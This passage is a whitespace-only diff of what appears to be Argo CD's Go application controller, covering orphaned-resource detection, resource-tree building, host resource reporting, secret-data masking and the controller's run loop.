\"default\" {\n-\t\treturn true\n-\t}\n-\tif key.Group == \"\" && key.Kind == \"ConfigMap\" && key.Name == \"kube-root-ca.crt\" {\n-\t\treturn true\n-\t}\n-\tlist := proj.Spec.OrphanedResources.Ignore\n-\tfor _, item := range list {\n-\t\tif item.Kind == \"\" || glob.Match(item.Kind, key.Kind) {\n-\t\t\tif glob.Match(item.Group, key.Group) {\n-\t\t\t\tif item.Name == \"\" || glob.Match(item.Name, key.Name) {\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn false\n+        if key.Namespace == \"default\" && key.Group == \"\" && key.Kind == kube.ServiceKind && key.Name == \"kubernetes\" {\n+                return true\n+        }\n+        if key.Group == \"\" && key.Kind == kube.ServiceAccountKind && key.Name == \"default\" {\n+                return true\n+        }\n+        if key.Group == \"\" && key.Kind == \"ConfigMap\" && key.Name == \"kube-root-ca.crt\" {\n+                return true\n+        }\n+        list := proj.Spec.OrphanedResources.Ignore\n+        for _, item := range list {\n+                if item.Kind == \"\" || glob.Match(item.Kind, key.Kind) {\n+                        if glob.Match(item.Group, key.Group) {\n+                                if item.Name == \"\" || glob.Match(item.Name, key.Name) {\n+                                        return true\n+                                }\n+                        }\n+                }\n+        }\n+        return false\n }\n \n func (ctrl *ApplicationController) getResourceTree(a *appv1.Application, managedResources []*appv1.ResourceDiff) (*appv1.ApplicationTree, error) {\n-\tnodes := make([]appv1.ResourceNode, 0)\n-\tproj, err := ctrl.getAppProj(a)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\torphanedNodesMap := make(map[kube.ResourceKey]appv1.ResourceNode)\n-\twarnOrphaned := true\n-\tif proj.Spec.OrphanedResources != nil {\n-\t\torphanedNodesMap, err = ctrl.stateCache.GetNamespaceTopLevelResources(a.Spec.Destination.Server, a.Spec.Destination.Namespace)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\twarnOrphaned = proj.Spec.OrphanedResources.IsWarn()\n-\t}\n-\tfor i := range managedResources {\n-\t\tmanagedResource := managedResources[i]\n-\t\tdelete(orphanedNodesMap, kube.NewResourceKey(managedResource.Group, managedResource.Kind, managedResource.Namespace, managedResource.Name))\n-\t\tvar live = &unstructured.Unstructured{}\n-\t\terr := json.Unmarshal([]byte(managedResource.LiveState), &live)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tvar target = &unstructured.Unstructured{}\n-\t\terr = json.Unmarshal([]byte(managedResource.TargetState), &target)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tif live == nil {\n-\t\t\tnodes = append(nodes, appv1.ResourceNode{\n-\t\t\t\tResourceRef: appv1.ResourceRef{\n-\t\t\t\t\tVersion:   target.GroupVersionKind().Version,\n-\t\t\t\t\tName:      managedResource.Name,\n-\t\t\t\t\tKind:      managedResource.Kind,\n-\t\t\t\t\tGroup:     managedResource.Group,\n-\t\t\t\t\tNamespace: managedResource.Namespace,\n-\t\t\t\t},\n-\t\t\t})\n-\t\t} else {\n-\t\t\terr := ctrl.stateCache.IterateHierarchy(a.Spec.Destination.Server, kube.GetResourceKey(live), func(child appv1.ResourceNode, appName string) bool {\n-\t\t\t\tpermitted, _ := proj.IsResourcePermitted(schema.GroupKind{Group: child.ResourceRef.Group, Kind: child.ResourceRef.Kind}, child.Namespace, a.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n-\t\t\t\t\treturn ctrl.db.GetProjectClusters(context.TODO(), project)\n-\t\t\t\t})\n-\t\t\t\tif !permitted {\n-\t\t\t\t\treturn false\n-\t\t\t\t}\n-\t\t\t\tnodes = append(nodes, child)\n-\t\t\t\treturn true\n-\t\t\t})\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t}\n-\torphanedNodes := make([]appv1.ResourceNode, 0)\n-\tfor k := range orphanedNodesMap {\n-\t\tif k.Namespace != \"\" && proj.IsGroupKindPermitted(k.GroupKind(), true) && !isKnownOrphanedResourceExclusion(k, proj) {\n-\t\t\terr := ctrl.stateCache.IterateHierarchy(a.Spec.Destination.Server, k, func(child appv1.ResourceNode, appName string) bool {\n-\t\t\t\tbelongToAnotherApp := false\n-\t\t\t\tif appName != \"\" {\n-\t\t\t\t\tappKey := ctrl.toAppKey(appName)\n-\t\t\t\t\tif _, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey); exists && err == nil {\n-\t\t\t\t\t\tbelongToAnotherApp = true\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\n-\t\t\t\tif belongToAnotherApp {\n-\t\t\t\t\treturn false\n-\t\t\t\t}\n-\n-\t\t\t\tpermitted, _ := proj.IsResourcePermitted(schema.GroupKind{Group: child.ResourceRef.Group, Kind: child.ResourceRef.Kind}, child.Namespace, a.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n-\t\t\t\t\treturn ctrl.db.GetProjectClusters(context.TODO(), project)\n-\t\t\t\t})\n-\n-\t\t\t\tif !permitted {\n-\t\t\t\t\treturn false\n-\t\t\t\t}\n-\t\t\t\torphanedNodes = append(orphanedNodes, child)\n-\t\t\t\treturn true\n-\t\t\t})\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t}\n-\tvar conditions []appv1.ApplicationCondition\n-\tif len(orphanedNodes) > 0 && warnOrphaned {\n-\t\tconditions = []appv1.ApplicationCondition{{\n-\t\t\tType:    appv1.ApplicationConditionOrphanedResourceWarning,\n-\t\t\tMessage: fmt.Sprintf(\"Application has %d orphaned resources\", len(orphanedNodes)),\n-\t\t}}\n-\t}\n-\ta.Status.SetConditions(conditions, map[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionOrphanedResourceWarning: true})\n-\tsort.Slice(orphanedNodes, func(i, j int) bool {\n-\t\treturn orphanedNodes[i].ResourceRef.String() < orphanedNodes[j].ResourceRef.String()\n-\t})\n-\n-\thosts, err := ctrl.getAppHosts(a, nodes)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn &appv1.ApplicationTree{Nodes: nodes, OrphanedNodes: orphanedNodes, Hosts: hosts}, nil\n+        nodes := make([]appv1.ResourceNode, 0)\n+        proj, err := ctrl.getAppProj(a)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        orphanedNodesMap := make(map[kube.ResourceKey]appv1.ResourceNode)\n+        warnOrphaned := true\n+        if proj.Spec.OrphanedResources != nil {\n+                orphanedNodesMap, err = ctrl.stateCache.GetNamespaceTopLevelResources(a.Spec.Destination.Server, a.Spec.Destination.Namespace)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                warnOrphaned = proj.Spec.OrphanedResources.IsWarn()\n+        }\n+        for i := range managedResources {\n+                managedResource := managedResources[i]\n+                delete(orphanedNodesMap, kube.NewResourceKey(managedResource.Group, managedResource.Kind, managedResource.Namespace, managedResource.Name))\n+                var live = &unstructured.Unstructured{}\n+                err := json.Unmarshal([]byte(managedResource.LiveState), &live)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                var target = &unstructured.Unstructured{}\n+                err = json.Unmarshal([]byte(managedResource.TargetState), &target)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                if live == nil {\n+                        nodes = append(nodes, appv1.ResourceNode{\n+                                ResourceRef: appv1.ResourceRef{\n+                                        Version:   target.GroupVersionKind().Version,\n+                                        Name:      managedResource.Name,\n+                                        Kind:      managedResource.Kind,\n+                                        Group:     managedResource.Group,\n+                                        Namespace: managedResource.Namespace,\n+                                },\n+                        })\n+                } else {\n+                        err := ctrl.stateCache.IterateHierarchy(a.Spec.Destination.Server, kube.GetResourceKey(live), func(child appv1.ResourceNode, appName string) bool {\n+                                permitted, _ := proj.IsResourcePermitted(schema.GroupKind{Group: child.ResourceRef.Group, Kind: child.ResourceRef.Kind}, child.Namespace, a.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n+                                        return ctrl.db.GetProjectClusters(context.TODO(), project)\n+                                })\n+                                if !permitted {\n+                                        return false\n+                                }\n+                                nodes = append(nodes, child)\n+                                return true\n+                        })\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                }\n+        }\n+        orphanedNodes := make([]appv1.ResourceNode, 0)\n+        for k := range orphanedNodesMap {\n+                if k.Namespace != \"\" && proj.IsGroupKindPermitted(k.GroupKind(), true) && !isKnownOrphanedResourceExclusion(k, proj) {\n+                        err := ctrl.stateCache.IterateHierarchy(a.Spec.Destination.Server, k, func(child appv1.ResourceNode, appName string) bool {\n+                                belongToAnotherApp := false\n+                                if appName != \"\" {\n+                                        appKey := ctrl.toAppKey(appName)\n+                                        if _, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey); exists && err == nil {\n+                                                belongToAnotherApp = true\n+                                        }\n+                                }\n+\n+                                if belongToAnotherApp {\n+                                        return false\n+                                }\n+\n+                                permitted, _ := proj.IsResourcePermitted(schema.GroupKind{Group: child.ResourceRef.Group, Kind: child.ResourceRef.Kind}, child.Namespace, a.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n+                                        return ctrl.db.GetProjectClusters(context.TODO(), project)\n+                                })\n+\n+                                if !permitted {\n+                                        return false\n+                                }\n+                                orphanedNodes = append(orphanedNodes, child)\n+                                return true\n+                        })\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                }\n+        }\n+        var conditions []appv1.ApplicationCondition\n+        if len(orphanedNodes) > 0 && warnOrphaned {\n+                conditions = []appv1.ApplicationCondition{{\n+                        Type:    appv1.ApplicationConditionOrphanedResourceWarning,\n+                        Message: fmt.Sprintf(\"Application has %d orphaned resources\", len(orphanedNodes)),\n+                }}\n+        }\n+        a.Status.SetConditions(conditions, map[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionOrphanedResourceWarning: true})\n+        sort.Slice(orphanedNodes, func(i, j int) bool {\n+                return orphanedNodes[i].ResourceRef.String() < orphanedNodes[j].ResourceRef.String()\n+        })\n+\n+        hosts, err := ctrl.getAppHosts(a, nodes)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return &appv1.ApplicationTree{Nodes: nodes, OrphanedNodes: orphanedNodes, Hosts: hosts}, nil\n }\n \n func (ctrl *ApplicationController) getAppHosts(a *appv1.Application, appNodes []appv1.ResourceNode) ([]appv1.HostInfo, error) {\n-\tsupportedResourceNames := map[v1.ResourceName]bool{\n-\t\tv1.ResourceCPU:     true,\n-\t\tv1.ResourceStorage: true,\n-\t\tv1.ResourceMemory:  true,\n-\t}\n-\tappPods := map[kube.ResourceKey]bool{}\n-\tfor _, node := range appNodes {\n-\t\tif node.Group == \"\" && node.Kind == kube.PodKind {\n-\t\t\tappPods[kube.NewResourceKey(node.Group, node.Kind, node.Namespace, node.Name)] = true\n-\t\t}\n-\t}\n-\n-\tallNodesInfo := map[string]statecache.NodeInfo{}\n-\tallPodsByNode := map[string][]statecache.PodInfo{}\n-\tappPodsByNode := map[string][]statecache.PodInfo{}\n-\terr := ctrl.stateCache.IterateResources(a.Spec.Destination.Server, func(res *clustercache.Resource, info *statecache.ResourceInfo) {\n-\t\tkey := res.ResourceKey()\n-\n-\t\tswitch {\n-\t\tcase info.NodeInfo != nil && key.Group == \"\" && key.Kind == \"Node\":\n-\t\t\tallNodesInfo[key.Name] = *info.NodeInfo\n-\t\tcase info.PodInfo != nil && key.Group == \"\" && key.Kind == kube.PodKind:\n-\t\t\tif appPods[key] {\n-\t\t\t\tappPodsByNode[info.PodInfo.NodeName] = append(appPodsByNode[info.PodInfo.NodeName], *info.PodInfo)\n-\t\t\t} else {\n-\t\t\t\tallPodsByNode[info.PodInfo.NodeName] = append(allPodsByNode[info.PodInfo.NodeName], *info.PodInfo)\n-\t\t\t}\n-\t\t}\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvar hosts []appv1.HostInfo\n-\tfor nodeName, appPods := range appPodsByNode {\n-\t\tnode, ok := allNodesInfo[nodeName]\n-\t\tif !ok {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tneighbors := allPodsByNode[nodeName]\n-\n-\t\tresources := map[v1.ResourceName]appv1.HostResourceInfo{}\n-\t\tfor name, resource := range node.Capacity {\n-\t\t\tinfo := resources[name]\n-\t\t\tinfo.ResourceName = name\n-\t\t\tinfo.Capacity += resource.MilliValue()\n-\t\t\tresources[name] = info\n-\t\t}\n-\n-\t\tfor _, pod := range appPods {\n-\t\t\tfor name, resource := range pod.ResourceRequests {\n-\t\t\t\tif !supportedResourceNames[name] {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\n-\t\t\t\tinfo := resources[name]\n-\t\t\t\tinfo.RequestedByApp += resource.MilliValue()\n-\t\t\t\tresources[name] = info\n-\t\t\t}\n-\t\t}\n-\n-\t\tfor _, pod := range neighbors {\n-\t\t\tfor name, resource := range pod.ResourceRequests {\n-\t\t\t\tif !supportedResourceNames[name] || pod.Phase == v1.PodSucceeded || pod.Phase == v1.PodFailed {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\tinfo := resources[name]\n-\t\t\t\tinfo.RequestedByNeighbors += resource.MilliValue()\n-\t\t\t\tresources[name] = info\n-\t\t\t}\n-\t\t}\n-\n-\t\tvar resourcesInfo []appv1.HostResourceInfo\n-\t\tfor _, info := range resources {\n-\t\t\tif supportedResourceNames[info.ResourceName] && info.Capacity > 0 {\n-\t\t\t\tresourcesInfo = append(resourcesInfo, info)\n-\t\t\t}\n-\t\t}\n-\t\tsort.Slice(resourcesInfo, func(i, j int) bool {\n-\t\t\treturn resourcesInfo[i].ResourceName < resourcesInfo[j].ResourceName\n-\t\t})\n-\t\thosts = append(hosts, appv1.HostInfo{Name: nodeName, SystemInfo: node.SystemInfo, ResourcesInfo: resourcesInfo})\n-\t}\n-\treturn hosts, nil\n+        supportedResourceNames := map[v1.ResourceName]bool{\n+                v1.ResourceCPU:     true,\n+                v1.ResourceStorage: true,\n+                v1.ResourceMemory:  true,\n+        }\n+        appPods := map[kube.ResourceKey]bool{}\n+        for _, node := range appNodes {\n+                if node.Group == \"\" && node.Kind == kube.PodKind {\n+                        appPods[kube.NewResourceKey(node.Group, node.Kind, node.Namespace, node.Name)] = true\n+                }\n+        }\n+\n+        allNodesInfo := map[string]statecache.NodeInfo{}\n+        allPodsByNode := map[string][]statecache.PodInfo{}\n+        appPodsByNode := map[string][]statecache.PodInfo{}\n+        err := ctrl.stateCache.IterateResources(a.Spec.Destination.Server, func(res *clustercache.Resource, info *statecache.ResourceInfo) {\n+                key := res.ResourceKey()\n+\n+                switch {\n+                case info.NodeInfo != nil && key.Group == \"\" && key.Kind == \"Node\":\n+                        allNodesInfo[key.Name] = *info.NodeInfo\n+                case info.PodInfo != nil && key.Group == \"\" && key.Kind == kube.PodKind:\n+                        if appPods[key] {\n+                                appPodsByNode[info.PodInfo.NodeName] = append(appPodsByNode[info.PodInfo.NodeName], *info.PodInfo)\n+                        } else {\n+                                allPodsByNode[info.PodInfo.NodeName] = append(allPodsByNode[info.PodInfo.NodeName], *info.PodInfo)\n+                        }\n+                }\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        var hosts []appv1.HostInfo\n+        for nodeName, appPods := range appPodsByNode {\n+                node, ok := allNodesInfo[nodeName]\n+                if !ok {\n+                        continue\n+                }\n+\n+                neighbors := allPodsByNode[nodeName]\n+\n+                resources := map[v1.ResourceName]appv1.HostResourceInfo{}\n+                for name, resource := range node.Capacity {\n+                        info := resources[name]\n+                        info.ResourceName = name\n+                        info.Capacity += resource.MilliValue()\n+                        resources[name] = info\n+                }\n+\n+                for _, pod := range appPods {\n+                        for name, resource := range pod.ResourceRequests {\n+                                if !supportedResourceNames[name] {\n+                                        continue\n+                                }\n+\n+                                info := resources[name]\n+                                info.RequestedByApp += resource.MilliValue()\n+                                resources[name] = info\n+                        }\n+                }\n+\n+                for _, pod := range neighbors {\n+                        for name, resource := range pod.ResourceRequests {\n+                                if !supportedResourceNames[name] || pod.Phase == v1.PodSucceeded || pod.Phase == v1.PodFailed {\n+                                        continue\n+                                }\n+                                info := resources[name]\n+                                info.RequestedByNeighbors += resource.MilliValue()\n+                                resources[name] = info\n+                        }\n+                }\n+\n+                var resourcesInfo []appv1.HostResourceInfo\n+                for _, info := range resources {\n+                        if supportedResourceNames[info.ResourceName] && info.Capacity > 0 {\n+                                resourcesInfo = append(resourcesInfo, info)\n+                        }\n+                }\n+                sort.Slice(resourcesInfo, func(i, j int) bool {\n+                        return resourcesInfo[i].ResourceName < resourcesInfo[j].ResourceName\n+                })\n+                hosts = append(hosts, appv1.HostInfo{Name: nodeName, SystemInfo: node.SystemInfo, ResourcesInfo: resourcesInfo})\n+        }\n+        return hosts, nil\n }\n \n func (ctrl *ApplicationController) hideSecretData(app *appv1.Application, comparisonResult *comparisonResult) ([]*appv1.ResourceDiff, error) {\n-\titems := make([]*appv1.ResourceDiff, len(comparisonResult.managedResources))\n-\tfor i := range comparisonResult.managedResources {\n-\t\tres := comparisonResult.managedResources[i]\n-\t\titem := appv1.ResourceDiff{\n-\t\t\tNamespace:       res.Namespace,\n-\t\t\tName:            res.Name,\n-\t\t\tGroup:           res.Group,\n-\t\t\tKind:            res.Kind,\n-\t\t\tHook:            res.Hook,\n-\t\t\tResourceVersion: res.ResourceVersion,\n-\t\t}\n-\n-\t\ttarget := res.Target\n-\t\tlive := res.Live\n-\t\tresDiff := res.Diff\n-\t\tif res.Kind == kube.SecretKind && res.Group == \"\" {\n-\t\t\tvar err error\n-\t\t\ttarget, live, err = diff.HideSecretData(res.Target, res.Live)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error hiding secret data: %s\", err)\n-\t\t\t}\n-\t\t\tcompareOptions, err := ctrl.settingsMgr.GetResourceCompareOptions()\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error getting resource compare options: %s\", err)\n-\t\t\t}\n-\t\t\tresourceOverrides, err := ctrl.settingsMgr.GetResourceOverrides()\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error getting resource overrides: %s\", err)\n-\t\t\t}\n-\t\t\tappLabelKey, err := ctrl.settingsMgr.GetAppInstanceLabelKey()\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error getting app instance label key: %s\", err)\n-\t\t\t}\n-\t\t\ttrackingMethod, err := ctrl.settingsMgr.GetTrackingMethod()\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error getting tracking method: %s\", err)\n-\t\t\t}\n-\n-\t\t\tclusterCache, err := ctrl.stateCache.GetClusterCache(app.Spec.Destination.Server)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error getting cluster cache: %s\", err)\n-\t\t\t}\n-\t\t\tdiffConfig, err := argodiff.NewDiffConfigBuilder().\n-\t\t\t\tWithDiffSettings(app.Spec.IgnoreDifferences, resourceOverrides, compareOptions.IgnoreAggregatedRoles).\n-\t\t\t\tWithTracking(appLabelKey, trackingMethod).\n-\t\t\t\tWithNoCache().\n-\t\t\t\tWithLogger(logutils.NewLogrusLogger(logutils.NewWithCurrentConfig())).\n-\t\t\t\tWithGVKParser(clusterCache.GetGVKParser()).\n-\t\t\t\tBuild()\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"appcontroller error building diff config: %s\", err)\n-\t\t\t}\n-\n-\t\t\tdiffResult, err := argodiff.StateDiff(live, target, diffConfig)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error applying diff: %s\", err)\n-\t\t\t}\n-\t\t\tresDiff = diffResult\n-\t\t}\n-\n-\t\tif live != nil {\n-\t\t\tdata, err := json.Marshal(live)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error marshaling live json: %s\", err)\n-\t\t\t}\n-\t\t\titem.LiveState = string(data)\n-\t\t} else {\n-\t\t\titem.LiveState = \"null\"\n-\t\t}\n-\n-\t\tif target != nil {\n-\t\t\tdata, err := json.Marshal(target)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error marshaling target json: %s\", err)\n-\t\t\t}\n-\t\t\titem.TargetState = string(data)\n-\t\t} else {\n-\t\t\titem.TargetState = \"null\"\n-\t\t}\n-\t\titem.PredictedLiveState = string(resDiff.PredictedLive)\n-\t\titem.NormalizedLiveState = string(resDiff.NormalizedLive)\n-\t\titem.Modified = resDiff.Modified\n-\n-\t\titems[i] = &item\n-\t}\n-\treturn items, nil\n+        items := make([]*appv1.ResourceDiff, len(comparisonResult.managedResources))\n+        for i := range comparisonResult.managedResources {\n+                res := comparisonResult.managedResources[i]\n+                item := appv1.ResourceDiff{\n+                        Namespace:       res.Namespace,\n+                        Name:            res.Name,\n+                        Group:           res.Group,\n+                        Kind:            res.Kind,\n+                        Hook:            res.Hook,\n+                        ResourceVersion: res.ResourceVersion,\n+                }\n+\n+                target := res.Target\n+                live := res.Live\n+                resDiff := res.Diff\n+                if res.Kind == kube.SecretKind && res.Group == \"\" {\n+                        var err error\n+                        target, live, err = diff.HideSecretData(res.Target, res.Live)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error hiding secret data: %s\", err)\n+                        }\n+                        compareOptions, err := ctrl.settingsMgr.GetResourceCompareOptions()\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error getting resource compare options: %s\", err)\n+                        }\n+                        resourceOverrides, err := ctrl.settingsMgr.GetResourceOverrides()\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error getting resource overrides: %s\", err)\n+                        }\n+                        appLabelKey, err := ctrl.settingsMgr.GetAppInstanceLabelKey()\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error getting app instance label key: %s\", err)\n+                        }\n+                        trackingMethod, err := ctrl.settingsMgr.GetTrackingMethod()\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error getting tracking method: %s\", err)\n+                        }\n+\n+                        clusterCache, err := ctrl.stateCache.GetClusterCache(app.Spec.Destination.Server)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error getting cluster cache: %s\", err)\n+                        }\n+                        diffConfig, err := argodiff.NewDiffConfigBuilder().\n+                                WithDiffSettings(app.Spec.IgnoreDifferences, resourceOverrides, compareOptions.IgnoreAggregatedRoles).\n+                                WithTracking(appLabelKey, trackingMethod).\n+                                WithNoCache().\n+                                WithLogger(logutils.NewLogrusLogger(logutils.NewWithCurrentConfig())).\n+                                WithGVKParser(clusterCache.GetGVKParser()).\n+                                Build()\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"appcontroller error building diff config: %s\", err)\n+                        }\n+\n+                        diffResult, err := argodiff.StateDiff(live, target, diffConfig)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error applying diff: %s\", err)\n+                        }\n+                        resDiff = diffResult\n+                }\n+\n+                if live != nil {\n+                        data, err := json.Marshal(live)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error marshaling live json: %s\", err)\n+                        }\n+                        item.LiveState = string(data)\n+                } else {\n+                        item.LiveState = \"null\"\n+                }\n+\n+                if target != nil {\n+                        data, err := json.Marshal(target)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error marshaling target json: %s\", err)\n+                        }\n+                        item.TargetState = string(data)\n+                } else {\n+                        item.TargetState = \"null\"\n+                }\n+                item.PredictedLiveState = string(resDiff.PredictedLive)\n+                item.NormalizedLiveState = string(resDiff.NormalizedLive)\n+                item.Modified = resDiff.Modified\n+\n+                items[i] = &item\n+        }\n+        return items, nil\n }\n \n // Run starts the Application CRD controller.\n func (ctrl *ApplicationController) Run(ctx context.Context, statusProcessors int, operationProcessors int) {\n-\tdefer runtime.HandleCrash()\n-\tdefer ctrl.appRefreshQueue.ShutDown()\n-\tdefer ctrl.appComparisonTypeRefreshQueue.ShutDown()\n-\tdefer ctrl.appOperationQueue.ShutDown()\n-\tdefer ctrl.projectRefreshQueue.ShutDown()\n-\n-\tctrl.metricsServer.RegisterClustersInfoSource(ctx, ctrl.stateCache)\n-\tctrl.RegisterClusterSecretUpdater(ctx)\n-\n-\tgo ctrl.appInformer.Run(ctx.Done())\n-\tgo ctrl.projInformer.Run(ctx.Done())\n-\n-\terrors.CheckError(ctrl.stateCache.Init())\n-\n-\tif !cache.WaitForCacheSync(ctx.Done(), ctrl.appInformer.HasSynced, ctrl.projInformer.HasSynced) {\n-\t\tlog.Error(\"Timed out waiting for caches to sync\")\n-\t\treturn\n-\t}\n-\n-\tgo func() { errors.CheckError(ctrl.stateCache.Run(ctx)) }()\n-\tgo func() { errors.CheckError(ctrl.metricsServer.ListenAndServe()) }()\n-\n-\tfor i := 0; i < statusProcessors; i++ {\n-\t\tgo wait.Until(func() {\n-\t\t\tfor ctrl.processAppRefreshQueueItem() {\n-\t\t\t}\n-\t\t}, time.Second, ctx.Done())\n-\t}\n-\n-\tfor i := 0; i < operationProcessors; i++ {\n-\t\tgo wait.Until(func() {\n-\t\t\tfor ctrl.processAppOperationQueueItem() {\n-\t\t\t}\n-\t\t}, time.Second, ctx.Done())\n-\t}\n-\n-\tgo wait.Until(func() {\n-\t\tfor ctrl.processAppComparisonTypeQueueItem() {\n-\t\t}\n-\t}, time.Second, ctx.Done())\n-\n-\tgo wait.Until(func() {\n-\t\tfor ctrl.processProjectQueueItem() {\n-\t\t}\n-\t}, time.Second, ctx.Done())\n-\t<-ctx.Done()\n+        defer runtime.HandleCrash()\n+        defer ctrl.appRefreshQueue.ShutDown()\n+        defer ctrl.appComparisonTypeRefreshQueue.ShutDown()\n+        defer ctrl.appOperationQueue.ShutDown()\n+        defer ctrl.projectRefreshQueue.ShutDown()\n+\n+        ctrl.metricsServer.RegisterClustersInfoSource(ctx, ctrl.stateCache)\n+        ctrl.RegisterClusterSecretUpdater(ctx)\n+\n+        go ctrl.appInformer.Run(ctx.Done())\n+        go ctrl.projInformer.Run(ctx.Done())\n+\n+        errors.CheckError(ctrl.stateCache.Init())\n+\n+        if !cache.WaitForCacheSync(ctx.Done(), ctrl.appInformer.HasSynced, ctrl.projInformer.HasSynced) {\n+                log.Error(\"Timed out waiting for caches to sync\")\n+                return\n+        }\n+\n+        go func() { errors.CheckError(ctrl.stateCache.Run(ctx)) }()\n+        go func() { errors.CheckError(ctrl.metricsServer.ListenAndServe()) }()\n+\n+        for i := 0; i < statusProcessors; i++ {\n+                go wait.Until(func() {\n+                        for ctrl.processAppRefreshQueueItem() {\n+                        }\n+                }, time.Second, ctx.Done())\n+        }\n+\n+        for i := 0; i < operationProcessors; i++ {\n+                go wait.Until(func() {\n+                        for ctrl.processAppOperationQueueItem() {\n+                        }\n+                }, time.Second, ctx.Done())\n+        }\n+\n+        go wait.Until(func() {\n+                for ctrl.processAppComparisonTypeQueueItem() {\n+                }\n+        }, time.Second, ctx.Done())\n+\n+        go wait.Until(func() {\n+                for ctrl.processProjectQueueItem() {\n+                }\n+        }, time.Second, ctx.Done())\n+        <-ctx.Done()\n }\n \n // requestAppRefresh adds a request for given app to the refresh queue. appName\n // needs to be the qualified name of the application, i.e. <namespace>/<name>.\n func (ctrl *ApplicationController) requestAppRefresh(appName string, compareWith *CompareWith, after *time.Duration) {\n-\tkey := ctrl.toAppKey(appName)\n-\n-\tif compareWith != nil && after != nil {\n-\t\tctrl.appComparisonTypeRefreshQueue.AddAfter(fmt.Sprintf(\"%s/%d\", key, compareWith), *after)\n-\t} else {\n-\t\tif compareWith != nil {\n-\t\t\tctrl.refreshRequestedAppsMutex.Lock()\n-\t\t\tctrl.refreshRequestedApps[key] = compareWith.Max(ctrl.refreshRequestedApps[key])\n-\t\t\tctrl.refreshRequestedAppsMutex.Unlock()\n-\t\t}\n-\t\tif after != nil {\n-\t\t\tctrl.appRefreshQueue.AddAfter(key, *after)\n-\t\t\tctrl.appOperationQueue.AddAfter(key, *after)\n-\t\t} else {\n-\t\t\tctrl.appRefreshQueue.Add(key)\n-\t\t\tctrl.appOperationQueue.Add(key)\n-\t\t}\n-\t}\n+        key := ctrl.toAppKey(appName)\n+\n+        if compareWith != nil && after != nil {\n+                ctrl.appComparisonTypeRefreshQueue.AddAfter(fmt.Sprintf(\"%s/%d\", key, compareWith), *after)\n+        } else {\n+                if compareWith != nil {\n+                        ctrl.refreshRequestedAppsMutex.Lock()\n+                        ctrl.refreshRequestedApps[key] = compareWith.Max(ctrl.refreshRequestedApps[key])\n+                        ctrl.refreshRequestedAppsMutex.Unlock()\n+                }\n+                if after != nil {\n+                        ctrl.appRefreshQueue.AddAfter(key, *after)\n+                        ctrl.appOperationQueue.AddAfter(key, *after)\n+                } else {\n+                        ctrl.appRefreshQueue.Add(key)\n+                        ctrl.appOperationQueue.Add(key)\n+                }\n+        }\n }\n \n func (ctrl *ApplicationController) isRefreshRequested(appName string) (bool, CompareWith) {\n-\tctrl.refreshRequestedAppsMutex.Lock()\n-\tdefer ctrl.refreshRequestedAppsMutex.Unlock()\n-\tlevel, ok := ctrl.refreshRequestedApps[appName]\n-\tif ok {\n-\t\tdelete(ctrl.refreshRequestedApps, appName)\n-\t}\n-\treturn ok, level\n+        ctrl.refreshRequestedAppsMutex.Lock()\n+        defer ctrl.refreshRequestedAppsMutex.Unlock()\n+        level, ok := ctrl.refreshRequestedApps[appName]\n+        if ok {\n+                delete(ctrl.refreshRequestedApps, appName)\n+        }\n+        return ok, level\n }\n \n func (ctrl *ApplicationController) processAppOperationQueueItem() (processNext bool) {\n-\tappKey, shutdown := ctrl.appOperationQueue.Get()\n-\tif shutdown {\n-\t\tprocessNext = 